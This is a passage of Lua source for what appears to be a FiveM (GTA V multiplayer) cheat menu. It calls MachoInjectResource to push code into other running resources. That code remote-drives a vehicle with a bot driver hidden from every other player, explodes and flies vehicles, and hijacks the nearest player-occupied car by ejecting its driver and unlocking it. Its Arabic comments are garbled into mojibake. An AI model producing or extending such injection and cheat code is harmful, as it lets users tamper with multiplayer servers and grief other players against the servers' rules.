                                    pcall(function()
                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                        SetAudioListenerPosition(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)
                                        local velocity = GetEntityVelocity(RemoteCar.Entity)
                                        SetAudioListenerVelocity(velocity.x, velocity.y, velocity.z)
                                        local heading = GetEntityHeading(RemoteCar.Entity)
                                        local radHeading = math.rad(heading)
                                        local forwardX = -math.sin(radHeading)
                                        local forwardY = math.cos(radHeading)
                                        SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                        SetAudioFlag("AudioListenerEnabled", true)
                                        SetAudioFlag("LoadMPData", true)
                                        SetAudioFlag("DisableFlightMusic", true)
                                        SetAudioFlag("PauseBeatRepeats", false)
                                    end)
                                end

                                RemoteCar.ToggleAudio = function()
                                    audioEnabled = not audioEnabled
                                    if audioEnabled then
                                        pcall(function()
                                            RemoteCar.UpdateAudioPosition()
                                        end)
                                        MachoMenuNotification("Remote Car", "Audio enabled - hearing from vehicle position")
                                    else
                                        pcall(function()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                local playerVelocity = GetEntityVelocity(RemoteCar.OriginalPed)
                                                SetAudioListenerVelocity(playerVelocity.x, playerVelocity.y, playerVelocity.z)
                                                local playerHeading = GetEntityHeading(RemoteCar.OriginalPed)
                                                local radHeading = math.rad(playerHeading)
                                                local forwardX = -math.sin(radHeading)
                                                local forwardY = math.cos(radHeading)
                                                SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                            end
                                        end)
                                        MachoMenuNotification("Remote Car", "Audio disabled - returned to normal audio")
                                    end
                                end

                                RemoteCar.RestoreOriginalAudio = function()
                                    pcall(function()
                                        SetAudioFlag("AudioListenerEnabled", false)
                                        ClearAudioFlags()
                                        if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                            local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                            SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                            SetAudioListenerVelocity(0.0, 0.0, 0.0)
                                            SetAudioListenerOrientation(0.0, 1.0, 0.0, 0.0, 0.0, 1.0)
                                        end
                                    end)
                                end

                                RemoteCar.CreateBotDriver = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    RemoteCar.OriginalPed = PlayerPedId()

                                    pcall(function()
                                        local existingDriver = GetPedInVehicleSeat(RemoteCar.Entity, -1)
                                        if existingDriver and existingDriver ~= 0 and existingDriver ~= RemoteCar.OriginalPed then
                                            if not IsPedAPlayer(existingDriver) then
                                                SetEntityAsMissionEntity(existingDriver, false, false)
                                                DeleteEntity(existingDriver)
                                            else
                                                TaskLeaveVehicle(existingDriver, RemoteCar.Entity, 0)
                                            end
                                        end
                                        for seat = 0, GetVehicleMaxNumberOfPassengers(RemoteCar.Entity) - 1 do
                                            local passenger = GetPedInVehicleSeat(RemoteCar.Entity, seat)
                                            if passenger and passenger ~= 0 and not IsPedAPlayer(passenger) then
                                                SetEntityAsMissionEntity(passenger, false, false)
                                                DeleteEntity(passenger)
                                            end
                                        end
                                    end)

                                    if not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end

                                    local modelHash = GetHashKey("mp_m_freemode_01")
                                    RequestModel(modelHash)
                                    local timeout = 0
                                    while not HasModelLoaded(modelHash) and timeout < 20 do
                                        Citizen.Wait(10)
                                        timeout = timeout + 1
                                    end

                                    if not HasModelLoaded(modelHash) or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end

                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                    local heading = GetEntityHeading(RemoteCar.Entity)

                                    local success, botPed = pcall(function()
                                        return CreatePed(5, modelHash, coords.x, coords.y, coords.z, heading, false, false)
                                    end)

                                    if not success or not botPed or botPed == 0 then
                                        return
                                    end

                                    RemoteCar.BotPed = botPed

                                    pcall(function()
                                        SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                        SetEntityInvincible(RemoteCar.BotPed, true)
                                        SetEntityVisible(RemoteCar.BotPed, true)
                                        SetPedAlertness(RemoteCar.BotPed, 0)
                                        SetPedCanRagdoll(RemoteCar.BotPed, false)
                                        SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                        SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                        SetEntityVisible(RemoteCar.BotPed, false, false)

                                        Citizen.CreateThread(function()
                                            while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(100)
                                                SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                SetEntityVisible(RemoteCar.BotPed, true, false)
                                                for i = 0, 255 do
                                                    if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                        SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                    end
                                                end
                                            end
                                        end)
                                    end)

                                    local enterTimeout = 0
                                    while not IsPedInVehicle(RemoteCar.BotPed, RemoteCar.Entity) and enterTimeout < 5 and DoesEntityExist(RemoteCar.Entity) do
                                        Citizen.Wait(20)
                                        enterTimeout = enterTimeout + 1
                                        TaskWarpPedIntoVehicle(RemoteCar.BotPed, RemoteCar.Entity, -1)
                                    end
                                end

                                RemoteCar.StartSpectate = function()
                                    if not RemoteCar.BotPed or not DoesEntityExist(RemoteCar.BotPed) then
                                        return
                                    end
                                    if DoesCamExist(RemoteCar.SpectateCamera) then
                                        DestroyCam(RemoteCar.SpectateCamera)
                                    end
                                    local success, camera = pcall(function()
                                        return CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                    end)
                                    if not success or not camera then
                                        return
                                    end
                                    RemoteCar.SpectateCamera = camera
                                    SetCamFov(RemoteCar.SpectateCamera, 75.0)
                                    RemoteCar.CameraDistance = 8.0
                                    RemoteCar.CameraHeight = 3.0
                                    RemoteCar.CameraAngleHorizontal = 0.0
                                    RemoteCar.CameraAngleVertical = -10.0
                                    isSpectating = true
                                    RenderScriptCams(1, 0, 0, 1, 1)
                                    Citizen.CreateThread(function()
                                        while isSpectating and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                            Citizen.Wait(0)
                                            pcall(function()
                                                if IsPedInAnyVehicle(RemoteCar.BotPed, false) then
                                                    local vehicle = GetVehiclePedIsIn(RemoteCar.BotPed, false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local vehicleCoords = GetEntityCoords(vehicle)
                                                        local mouseX = GetDisabledControlNormal(0, 1) * 15.0
                                                        local mouseY = GetDisabledControlNormal(0, 2) * 8.0
                                                        RemoteCar.CameraAngleHorizontal = RemoteCar.CameraAngleHorizontal + mouseX
                                                        RemoteCar.CameraAngleVertical = math.max(-45.0, math.min(45.0, RemoteCar.CameraAngleVertical + mouseY))
                                                        if IsControlPressed(0, 15) then
                                                            RemoteCar.CameraDistance = math.max(3.0, RemoteCar.CameraDistance - 0.5)
                                                        elseif IsControlPressed(0, 16) then
                                                            RemoteCar.CameraDistance = math.min(15.0, RemoteCar.CameraDistance + 0.5)
                                                        end
                                                        local radianHorizontal = math.rad(RemoteCar.CameraAngleHorizontal)
                                                        local radianVertical = math.rad(RemoteCar.CameraAngleVertical)
                                                        local offsetX = math.sin(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                        local offsetY = math.cos(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                        local offsetZ = math.sin(radianVertical) * RemoteCar.CameraDistance
                                                        local cameraPos = vector3(
                                                            vehicleCoords.x + offsetX,
                                                            vehicleCoords.y + offsetY,
                                                            vehicleCoords.z + RemoteCar.CameraHeight + offsetZ
                                                        )
                                                        SetFocusPosAndVel(cameraPos.x, cameraPos.y, cameraPos.z, 0.0, 0.0, 0.0)
                                                        SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                        PointCamAtEntity(RemoteCar.SpectateCamera, vehicle, 0.0, 0.0, 0.0, true)
                                                        DisableControlAction(0, 1, true)
                                                        DisableControlAction(0, 2, true)
                                                        DisableControlAction(0, 15, true)
                                                        DisableControlAction(0, 16, true)
                                                        if IsControlJustPressed(0, 45) then
                                                            RemoteCar.CameraDistance = 8.0
                                                            RemoteCar.CameraHeight = 3.0
                                                            RemoteCar.CameraAngleHorizontal = 0.0
                                                            RemoteCar.CameraAngleVertical = -10.0
                                                        end
                                                        SetTextFont(4)
                                                        SetTextProportional(1)
                                                        SetTextScale(0.0, 0.4)
                                                        SetTextColour(255, 255, 255, 255)
                                                        SetTextEntry("STRING")
                                                        local speed = GetEntitySpeed(vehicle) * 3.6
                                                        local audioStatus = audioEnabled and "ON" or "OFF"
                                                        DrawText(0.02, 0.02)
                                                    end
                                                end
                                            end)
                                        end
                                    end)
                                end

                                RemoteCar.StopSpectate = function()
                                    if isSpectating then
                                        isSpectating = false
                                        pcall(function()
                                            ClearFocus()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                ClearFocus()
                                            else
                                                ClearFocus()
                                            end
                                            RenderScriptCams(0, 0, 0, 1, 0)
                                            if DoesCamExist(RemoteCar.SpectateCamera) then
                                                DestroyCam(RemoteCar.SpectateCamera)
                                                RemoteCar.SpectateCamera = nil
                                            end
                                            SetPlayerControl(PlayerId(), true, 0)
                                        end)
                                    end
                                end

                                RemoteCar.MakeVehicleExplode = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    pcall(function()
                                        ExplodeVehicleInCutscene(RemoteCar.Entity, true)
                                    end)
                                end

                                RemoteCar.HandleHonking = function()
                                    if IsControlPressed(0, 51) then
                                        if not isHonking then
                                            isHonking = true
                                            pcall(function()
                                                SetVehicleDoorOpen(RemoteCar.Entity, 0, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 1, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 2, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 3, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 4, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 5, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 6, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 7, false, false)
                                            end)
                                        end
                                    else
                                        if isHonking then
                                            isHonking = false
                                            pcall(function()
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    for i = 0, 7 do
                                                        SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                    end
                                                end
                                            end)
                                        end
                                    end
                                end

                                RemoteCar.HandleKeys = function(distance)
                                    if IsControlJustReleased(0, 23) then
                                        isFlying = not isFlying
                                        pcall(function()
                                            if isFlying then
                                                SetVehicleGravity(RemoteCar.Entity, false)
                                                SetEntityCollision(RemoteCar.Entity, false, false)
                                                SetEntityCollision(RemoteCar.BotPed, false, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, GetEntityHeading(RemoteCar.Entity), 2, true)
                                                SetEntityDynamic(RemoteCar.Entity, false)
                                                SetEntityDynamic(RemoteCar.BotPed, false)
                                            else
                                                SetVehicleGravity(RemoteCar.Entity, true)
                                                SetEntityCollision(RemoteCar.Entity, true, true)
                                                SetEntityCollision(RemoteCar.BotPed, true, true)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                SetEntityDynamic(RemoteCar.Entity, true)
                                                SetEntityDynamic(RemoteCar.BotPed, true)
                                            end
                                        end)
                                    end
                                    if IsControlJustReleased(0, 47) then
                                        if isSpectating then
                                            RemoteCar.StopSpectate()
                                        else
                                            RemoteCar.StartSpectate()
                                        end
                                    end
                                    if IsControlJustPressed(0, 45) then
                                        pcall(function()
                                            if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                SetVehicleFixed(RemoteCar.Entity)
                                                SetVehicleDeformationFixed(RemoteCar.Entity)
                                                SetVehicleUndriveable(RemoteCar.Entity, false)
                                                SetVehicleEngineOn(RemoteCar.Entity, true, true, false)
                                                StopEntityFire(RemoteCar.Entity)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                local heading = GetEntityHeading(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z + 1.0, false, false, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                if not isFlying then
                                                    PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                end

                                                if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                    DeleteEntity(RemoteCar.BotPed)
                                                end

                                                local modelHash = GetHashKey("mp_m_freemode_01")
                                                if not HasModelLoaded(modelHash) then
                                                    RequestModel(modelHash)
                                                    while not HasModelLoaded(modelHash) do
                                                        Citizen.Wait(10)
                                                    end
                                                end

                                                RemoteCar.BotPed = CreatePedInsideVehicle(RemoteCar.Entity, 5, modelHash, -1, false, false)
                                                SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                                SetEntityInvincible(RemoteCar.BotPed, true)
                                                SetPedAlertness(RemoteCar.BotPed, 0)
                                                SetPedCanRagdoll(RemoteCar.BotPed, false)
                                                SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                                SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                                SetEntityVisible(RemoteCar.BotPed, false, false)

                                                Citizen.CreateThread(function()
                                                    while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                        Citizen.Wait(100)
                                                        SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                        SetEntityVisible(RemoteCar.BotPed, true, false)
                                                        for i = 0, 255 do
                                                            if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                                SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                            end
                                                        end
                                                    end
                                                end)

                                                if isSpectating and RemoteCar.SpectateCamera and DoesCamExist(RemoteCar.SpectateCamera) then
                                                    RemoteCar.CameraDistance = 8.0
                                                    RemoteCar.CameraHeight = 3.0
                                                    RemoteCar.CameraAngleHorizontal = 0.0
                                                    RemoteCar.CameraAngleVertical = -10.0
                                                    local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                    local cameraPos = vector3(
                                                        vehicleCoords.x,
                                                        vehicleCoords.y - 8.0,
                                                        vehicleCoords.z + 3.0
                                                    )
                                                    SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                    PointCamAtEntity(RemoteCar.SpectateCamera, RemoteCar.Entity, 0.0, 0.0, 0.0, true)
                                                end
                                            end
                                        end)
                                    end
                                    if IsControlJustPressed(0, 73) then
                                        RemoteCar.Stop()
                                        ClearFocus()
                                        return
                                    end
                                    if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                        if vehicleCoords then
                                            SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                        end
                                        pcall(function()
                                            if IsControlJustReleased(0, 26) then
                                                RemoteCar.MakeVehicleExplode()
                                            end
                                            RemoteCar.HandleHonking()
                                            if isFlying then
                                                local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                local up = IsControlPressed(0, 22)
                                                local down = IsControlPressed(0, 36)
                                                local boost = IsControlPressed(0, 21)
                                                local heading = GetEntityHeading(RemoteCar.Entity)
                                                local radHeading = math.rad(heading)
                                                local moveX = 0.0
                                                local moveY = 0.0
                                                local moveZ = 0.0
                                                SetVehicleGravity(RemoteCar.Entity, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                if forward then
                                                    moveX = moveX - math.sin(radHeading) * flightSpeed
                                                    moveY = moveY + math.cos(radHeading) * flightSpeed
                                                end
                                                if backward then
                                                    moveX = moveX + math.sin(radHeading) * flightSpeed
                                                    moveY = moveY - math.cos(radHeading) * flightSpeed
                                                end
                                                if left then
                                                    heading = heading + 3.0
                                                    SetEntityHeading(RemoteCar.Entity, heading)
                                                end
                                                if right then
                                                    heading = heading - 3.0
                                                    SetEntityHeading(RemoteCar.Entity, heading)
                                                end
                                                if up then
                                                    moveZ = moveZ + flightSpeed
                                                end
                                                if down then
                                                    moveZ = moveZ - flightSpeed
                                                end
                                                if boost then
                                                    moveX = moveX * 2.0
                                                    moveY = moveY * 2.0
                                                    moveZ = moveZ * 2.0
                                                end
                                                local currentCoords = GetEntityCoords(RemoteCar.Entity)
                                                local newCoords = vector3(
                                                    currentCoords.x + (moveX * 0.02),
                                                    currentCoords.y + (moveY * 0.02),
                                                    currentCoords.z + (moveZ * 0.02)
                                                )
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                            else
                                                local boost = IsControlPressed(0, 21)
                                                local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                local brake = IsControlPressed(0, 22)
                                                local actionTaken = false
                                                if boost and RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    SetVehicleForwardSpeed(RemoteCar.Entity, GetEntitySpeed(RemoteCar.Entity) + 2.0)
                                                end
                                                if forward and left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 7, 1)
                                                    actionTaken = true
                                                elseif forward and right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 8, 1)
                                                    actionTaken = true
                                                elseif backward and left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 13, 1)
                                                    actionTaken = true
                                                elseif backward and right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 14, 1)
                                                    actionTaken = true
                                                elseif forward then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 9, 1)
                                                    actionTaken = true
                                                elseif backward then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 22, 1)
                                                    actionTaken = true
                                                elseif left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 4, 1)
                                                    actionTaken = true
                                                elseif right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 5, 1)
                                                    actionTaken = true
                                                elseif brake then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 1000)
                                                    actionTaken = true
                                                end
                                                if not actionTaken then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                end
                                            end
                                        end)
                                    end
                                end

                                RemoteCar.Stop = function()
                                    pcall(function()
                                        RemoteCar.StopSpectate()
                                        RemoteCar.RestoreOriginalAudio()
                                        if isFlying then
                                            isFlying = false
                                            SetVehicleGravity(RemoteCar.Entity, true)
                                            SetEntityCollision(RemoteCar.Entity, true, true)
                                            SetEntityCollision(RemoteCar.BotPed, true, true)
                                            local coords = GetEntityCoords(RemoteCar.Entity)
                                            SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                            PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                            SetEntityDynamic(RemoteCar.Entity, true)
                                            SetEntityDynamic(RemoteCar.BotPed, true)
                                        end
                                        if isHonking then
                                            isHonking = false
                                            if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                for i = 0, 3 do
                                                    SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                end
                                                SetVehicleLights(RemoteCar.Entity, originalLightState)
                                            end
                                        end
                                        ClearFocus()
                                        if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                            local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                            SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                            ClearFocus()
                                        end
                                        if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                            DeleteEntity(RemoteCar.BotPed)
                                        end
                                        RemoteCar.Entity = nil
                                        RemoteCar.BotPed = nil
                                        RemoteCar.OriginalPed = nil
                                        audioEnabled = false
                                    end)
                                end

                                RemoteCar.Start()
                            end
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Remote Car", "Started remote control for your vehicle")
            else
                MachoMenuNotification("Remote Car", "No resources found!")
            end
        else
            MachoMenuNotification("Error", "You are not in a vehicle")
        end
    end,
    
    -- CallbackDisabled: This code runs when the checkbox is unselected (disabling remote control)
    function()
        if menuDUI then
            MachoDestroyDui(menuDUI)
            menuDUI = nil
            menuVisible = false
            MachoMenuNotification("Remote Car", "Remote control session ended and menu closed.")
        end
    end
)
MachoMenuKeybind(oyer, "Flip keybind", 0, function(key, toggle)
    selectedKey = key
end)
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        local playerPed = GetPlayerPed(-1)
        if not DoesEntityExist(playerPed) then
            return
        end

        if IsPedSittingInAnyVehicle(playerPed) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if DoesEntityExist(vehicle) then
                if selectedFlip == "Flip 1" then
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    if selectedFlip == "Flip 1" then
                        MachoMenuNotification("Success", "Flip 1  applied!")
                    end
                elseif selectedFlip == "Flip 2" then
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 0.0, 270.0, 0.0, 0, 0, 1, 1, 0, 1)
                    MachoMenuNotification("Success", "Flip 2  applied!")
                end
            else
                MachoMenuNotification("Error", "Vehicle not found!")
            end
        end
    end
end)
-- Ù…ØªØºÙŠØ± Ù„Ø­ÙØ¸ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ù…Ø®ØªØ§Ø±
local selectedKey = 0

-- Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ù…Ø®ØµØµ
MachoMenuKeybind(oyer, "Hijack Nearest Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Ù…Ø¹Ø§Ù„Ø¬ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙØªØ§Ø­
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId() -- âœ… ØªØ­Ø¯ÙŠØ« Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¯Ø§Ù„Ø©
        local nearestVehicle, distance = GetNearestVehicleWithPlayer()
        
        if nearestVehicle then
            local driverPed = GetPedInVehicleSeat(nearestVehicle, -1)
            
            ClearPedTasksImmediately(playerPed)
            
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local playerPed = PlayerPedId()
                    local targetVehicle = ]] .. nearestVehicle .. [[
                    local driverPed = GetPedInVehicleSeat(targetVehicle, -1)
                    
                    if targetVehicle ~= 0 then
                        SetPedMoveRateOverride(playerPed, 10.0)
                        ClearPedTasks(playerPed)
                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                        SetVehicleDoorsLocked(targetVehicle, 1)
                        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                        
                        if driverPed then
                            TaskLeaveVehicle(driverPed, targetVehicle, 0)
                        end
                        
                        SetPedMoveRateOverride(playerPed, 3.0)
                        
                        ClearPedTasks(playerPed)
                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                        
                        SetPedIntoVehicle(playerPed, targetVehicle, -1)
                        TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                        
                        SetPedMoveRateOverride(playerPed, 1.0)
                    end
                end)
            ]])
            
            MachoMenuNotification("Vehicle", "Hijacking nearest vehicle with player (Distance: " .. math.floor(distance) .. "m)")
        else
            MachoMenuNotification("Error", "No vehicle with player found")
        end
    end
end)

MachoMenuText(oyer,"Vehicle settings")


-- Ø¯Ø§Ù„Ø© MaxOut ÙƒØ§Ù…Ù„Ø© (Ù…Ù†Ø³ÙˆØ®Ø© Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ ÙˆÙ…Ø¹Ø¯Ù„Ø©)
function MaxOut(vehicle)
    -- ØªÙØ¹ÙŠÙ„ kit Ø§Ù„ØªØ¹Ø¯ÙŠÙ„
    SetVehicleModKit(vehicle, 0)
    SetVehicleWheelType(vehicle, 7)
    
    -- ØªØ·Ø¨ÙŠÙ‚ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© (0-16)
    SetVehicleMod(vehicle, 0, GetNumVehicleMods(vehicle, 0) - 1, false) -- Spoiler
    SetVehicleMod(vehicle, 1, GetNumVehicleMods(vehicle, 1) - 1, false) -- Front Bumper
    SetVehicleMod(vehicle, 2, GetNumVehicleMods(vehicle, 2) - 1, false) -- Rear Bumper
    SetVehicleMod(vehicle, 3, GetNumVehicleMods(vehicle, 3) - 1, false) -- Side Skirt
    SetVehicleMod(vehicle, 4, GetNumVehicleMods(vehicle, 4) - 1, false) -- Exhaust
    SetVehicleMod(vehicle, 5, GetNumVehicleMods(vehicle, 5) - 1, false) -- Frame
    SetVehicleMod(vehicle, 6, GetNumVehicleMods(vehicle, 6) - 1, false) -- Grille
    SetVehicleMod(vehicle, 7, GetNumVehicleMods(vehicle, 7) - 1, false) -- Hood
    SetVehicleMod(vehicle, 8, GetNumVehicleMods(vehicle, 8) - 1, false) -- Fender
    SetVehicleMod(vehicle, 9, GetNumVehicleMods(vehicle, 9) - 1, false) -- Right Fender
    SetVehicleMod(vehicle, 10, GetNumVehicleMods(vehicle, 10) - 1, false) -- Roof
    SetVehicleMod(vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false) -- Engine
    SetVehicleMod(vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false) -- Brakes
    SetVehicleMod(vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false) -- Transmission
    SetVehicleMod(vehicle, 14, 16, false) -- Horn
    SetVehicleMod(vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false) -- Suspension
    SetVehicleMod(vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false) -- Armor
    
    -- ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„Ø§Øª Ø§Ù„Ø®Ø§ØµØ©
    ToggleVehicleMod(vehicle, 17, true) -- Turbo
    ToggleVehicleMod(vehicle, 18, true) -- Tire Smoke
    ToggleVehicleMod(vehicle, 19, true) -- Xenon Lights
    ToggleVehicleMod(vehicle, 20, true) -- Front Wheels
    ToggleVehicleMod(vehicle, 21, true) -- Custom Tires
    ToggleVehicleMod(vehicle, 22, true) -- Bulletproof Tires
    
    -- ØªØ¹Ø¯ÙŠÙ„Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
    SetVehicleMod(vehicle, 23, 1, false) -- Front Wheels
    SetVehicleMod(vehicle, 24, 1, false) -- Back Wheels
    SetVehicleMod(vehicle, 25, GetNumVehicleMods(vehicle, 25) - 1, false) -- Plate Holder
    SetVehicleMod(vehicle, 27, GetNumVehicleMods(vehicle, 27) - 1, false) -- Trim Design
    SetVehicleMod(vehicle, 28, GetNumVehicleMods(vehicle, 28) - 1, false) -- Ornaments
    SetVehicleMod(vehicle, 30, GetNumVehicleMods(vehicle, 30) - 1, false) -- Dial Design
    SetVehicleMod(vehicle, 33, GetNumVehicleMods(vehicle, 33) - 1, false) -- Steering Wheel
    SetVehicleMod(vehicle, 34, GetNumVehicleMods(vehicle, 34) - 1, false) -- Shifter Leavers
    SetVehicleMod(vehicle, 35, GetNumVehicleMods(vehicle, 35) - 1, false) -- Plaques
    SetVehicleMod(vehicle, 38, GetNumVehicleMods(vehicle, 38) - 1, true) -- Hydraulics
    
    -- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†ÙˆØ§ÙØ° ÙˆØ§Ù„Ø¥Ø·Ø§Ø±Ø§Øª
    SetVehicleWindowTint(vehicle, 1) -- Dark tint
    SetVehicleTyresCanBurst(vehicle, false) -- Bulletproof tires
    SetVehicleNumberPlateTextIndex(vehicle, 5) -- Plate style
    
    -- Ø¥Ø¶Ø§Ø¡Ø© Ø§Ù„Ù†ÙŠÙˆÙ†
    SetVehicleNeonLightEnabled(vehicle, 0, true) -- Left
    SetVehicleNeonLightEnabled(vehicle, 1, true) -- Right
    SetVehicleNeonLightEnabled(vehicle, 2, true) -- Front
